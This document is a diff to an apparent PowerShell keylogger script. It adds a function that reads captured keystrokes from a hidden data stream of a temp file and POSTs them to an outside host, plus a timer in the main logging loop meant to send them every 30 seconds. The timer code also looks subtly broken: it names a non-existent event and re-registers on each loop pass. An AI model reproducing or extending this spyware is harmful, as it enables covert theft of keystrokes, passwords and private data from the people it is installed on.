@@ -34,8 +34,12 @@ $foreground_sig = @'
 public static extern IntPtr GetForegroundWindow();
 '@
 
+#Send data to your chosen domain
 function ExfiltrateData(){
-
+	$domain= "http://hackershelter.us/keylogger"
+	$data = Get-Content -Path "$env:temp\test_keylogger.txt" -Stream "Metadata"
+	$postData = @{data = $data}
+	Invoke-WebRequest -Uri $domain -Method POST -Body $postData
 }
 
 function WriteFileStream( $Logdata ){
@@ -57,6 +61,13 @@ try {
 
 	#While loop that handles all keylogging operations
     while ($true){
+		#Exfiltrate data every 30 seconds
+		$timer = New-Object Timers.Timer
+		$timer.Interval = 30000     # fire every 30s
+		$timer.AutoReset = $true
+		$timer.Enabled = $true
+		Register-ObjectEvent -InputObject $timer -EventName Exfiltrate -Action ExfiltrateData
+
 		#Hold the logging every 40 milliseconds after a cycle completes to handle "strange occurances"
 		Start-Sleep -Milliseconds 40
 		
